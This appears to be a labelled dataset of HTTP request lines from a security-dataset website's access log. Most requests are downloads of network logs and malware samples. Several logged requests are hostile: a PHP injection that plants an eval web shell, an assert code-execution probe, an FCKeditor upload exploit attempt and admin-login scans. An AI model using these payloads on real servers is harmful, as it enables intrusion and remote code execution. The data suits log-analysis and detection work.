14,1,200,0,GET / HTTP/1.1
27,1,404,0,GET /css/style.css HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/ssl.html HTTP/1.1
56,1,200,0,GET /Datasets%20Description/Network/notice.html HTTP/1.1
30,1,200,0,GET /twitter-icon.png HTTP/1.1
29,1,200,0,GET /GitHub-Mark.png HTTP/1.1
39,1,200,0,GET /bootstrap/img/favicon.ico HTTP/1.1
54,1,200,0,GET /Datasets%20Description/Network/smtp.html HTTP/1.1
49,1,301,1,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1
38,1,200,0,GET /maccdc2012/notice.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/conn.log.gz HTTP/1.1
18,1,404,0,GET /data HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.1
42,1,200,0,GET /maccdc2012/signatures.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/dhcp.log.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/ftp.log.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/dns.log.gz HTTP/1.1
25,1,200,0,GET /favicon.ico HTTP/1.1
40,1,206,1,GET /honeypot/honeypot.json.zip HTTP/1.1
24,1,200,0,GET /robots.txt HTTP/1.1
48,1,301,0,GET /self.logs/access.log.2018-03-27.gz HTTP/1.1
32,1,404,0,GET //e/admin/index.php HTTP/1.1
55,1,200,0,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1
33,1,200,0,GET /squid/access.log.gz HTTP/1.1
54,1,200,0,GET /Datasets%20Description/Network/http.html HTTP/1.1
21,1,301,0,GET /ads.txt HTTP/1.1
34,1,200,0,GET /auth.log/auth.log.gz HTTP/1.1
60,1,404,0,GET /Datasets%20Description/Network/signatures.html HTTP/1.1
56,1,200,0,GET /Datasets%20Description/Network/tunnel.html HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/dns.html HTTP/1.1
46,1,404,0,GET /apple-touch-icon-precomposed.png HTTP/1.1
34,1,404,0,GET /apple-touch-icon.png HTTP/1.1
48,1,304,0,GET /self.logs/access.log.2018-04-11.gz HTTP/1.1
24,1,301,0,PUT /t3q4jr.txt HTTP/1.1
134,3,301,0,POST /FCKeditor//editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/ HTTP/1.1
34,1,301,0,POST /index.php?s=captcha HTTP/1.1
34,1,301,0,GET /PHPmYaDMIN/index.PhP HTTP/1.1
15,1,301,0,POST / HTTP/1.1
28,1,301,0,POST /base/post.php HTTP/1.1
175,4,301,1,GET /index.php?a=fetch&templateFile=public/index&prefix=%27%27&content=<php>file_put_contents(%272020511173154.php%27_%27OK<?php%20@eval($_POST[dktcjdi]);?>%27)</php> HTTP/1.1
31,1,301,0,GET /2020511173154.php HTTP/1.1
42,1,301,0,POST /admin/FileUpload/uploadfile HTTP/1.1
37,1,301,0,POST /index.php?m=vod-search HTTP/1.1
61,4,301,0,POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
42,1,301,0,POST /?q=file/ajax/name/%23value/ HTTP/1.1
54,1,404,0,GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1
42,1,404,0,GET /apple-touch-icon-152x152.png HTTP/1.1
54,1,200,0,GET /Datasets%20Description/Network/dhcp.html HTTP/1.1
54,1,200,0,HEAD /self.logs/2015/access.log.2015-07-28.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-07-28.gz HTTP/1.1
63,1,200,0,GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1
22,1,200,0,GET /tg/b.zip HTTP/1.1
32,1,404,0,HEAD /manager/login.php HTTP/1.1
31,1,404,0,HEAD /manage/login.php HTTP/1.1
32,1,404,0,HEAD /htadmin/login.php HTTP/1.1
34,1,404,0,HEAD /admindede/login.php HTTP/1.1
30,1,404,0,HEAD /admin/login.php HTTP/1.1
22,1,200,0,GET /tg/c.zip HTTP/1.1
38,1,200,0,GET /maccdc2012/tunnel.log.gz HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/ftp.html HTTP/1.1
57,1,200,0,GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1
55,1,200,0,GET /Datasets%20Description/Network/files.html HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/ssh.html HTTP/1.1
35,1,200,0,GET /maccdc2012/ssh.log.gz HTTP/1.1
51,1,301,0,GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1
55,1,200,0,GET /Datasets%20Description/Network/weird.html HTTP/1.1
22,1,200,0,GET /tg/a.zip HTTP/1.1
51,1,301,0,GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1
49,1,200,0,GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1
38,1,200,0,GET /pe_static/op-cleaver.zip HTTP/1.1
35,1,200,0,GET /maccdc2012/ssl.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/smtp.log.gz HTTP/1.1
51,1,301,0,GET /Datasets%20Description/HTML_Bro_log_2 HTTP/1.1
37,1,200,0,GET /maccdc2012/weird.log.gz HTTP/1.1
62,1,200,0,GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1
49,1,200,0,GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1
34,1,200,0,GET /scada/scada_logs.zip HTTP/1.1
32,1,200,0,GET /pe_static/apt1.zip HTTP/1.1
43,1,200,0,GET /misc/zeus_dga_domains.txt.zip HTTP/1.1
33,1,200,0,GET /tg/tg_snort_fast.7z HTTP/1.1
33,1,200,0,GET /tg/tg_snort_full.7z HTTP/1.1
32,1,200,0,GET /pe_static/zeus.zip HTTP/1.1
43,1,200,0,GET /domaindata/domainmovement.zip HTTP/1.1
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1
47,1,200,1,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2018-12-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-12-08.gz HTTP/1.1
48,1,301,0,GET /self.logs/access.log.2018-03-04.gz HTTP/1.1
69,2,404,0,GET /index.php?param1=assert&param2=print(md5(57575848371)); HTTP/1.1
15,1,200,0,HEAD / HTTP/1.1
32,1,200,0,GET /self.logs/?C=N;O=D HTTP/1.1
32,1,200,0,GET /self.logs/?C=M;O=A HTTP/1.1
32,1,200,0,GET /self.logs/?C=S;O=A HTTP/1.1
32,1,200,0,GET /self.logs/?C=D;O=A HTTP/1.1
29,1,200,0,GET /self.logs/2015/ HTTP/1.1
29,1,200,0,GET /self.logs/2016/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-13.gz HTTP/1.1
